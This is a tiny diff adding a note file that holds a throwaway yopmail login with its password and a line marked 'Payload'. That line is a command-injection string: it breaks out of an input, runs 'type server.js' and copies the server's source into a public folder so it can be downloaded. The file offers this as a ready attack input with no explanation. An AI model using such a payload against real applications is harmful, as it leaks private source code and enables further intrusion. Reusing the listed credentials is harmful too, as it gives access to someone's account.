@@ -1,0 +1,6 @@
+ID: njkgiwgz2na4d3hr@yopmail.com
+MDP: 9h!5Z8FmfcbPGw5*
+
+
+Payload
+"" | type "server.js" > ./public/out.txt | exit
